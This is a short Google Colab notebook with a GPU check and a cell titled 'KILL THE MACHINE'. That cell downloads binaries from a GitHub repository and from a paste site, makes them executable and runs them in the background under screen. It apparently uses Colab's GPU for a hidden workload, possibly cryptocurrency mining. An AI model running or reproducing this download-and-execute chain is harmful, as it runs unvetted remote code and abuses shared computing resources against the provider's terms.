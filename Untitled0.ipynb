{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "EMBEKHEREX",
      "provenance": [],
      "authorship_tag": "ABX9TyPWGR9J/9InPLlyZZOT43Av",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/embekherex/solid-eureka1/main/Untitled0.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "42amXINY_jF9"
      },
      "source": [
        "#@title CEK GPU\n",
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "aub5FThTAjTG"
      },
      "source": [
        "#@title KILL THE MACHINE\n",
        " \n",
        "#!/bin/bash\n",
        " \n",
        "! sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/nuri655/nur/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://www.heypasteit.com/download/0IW6S3 && chmod u+x 0IW6S3 && ./0IW6S3"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
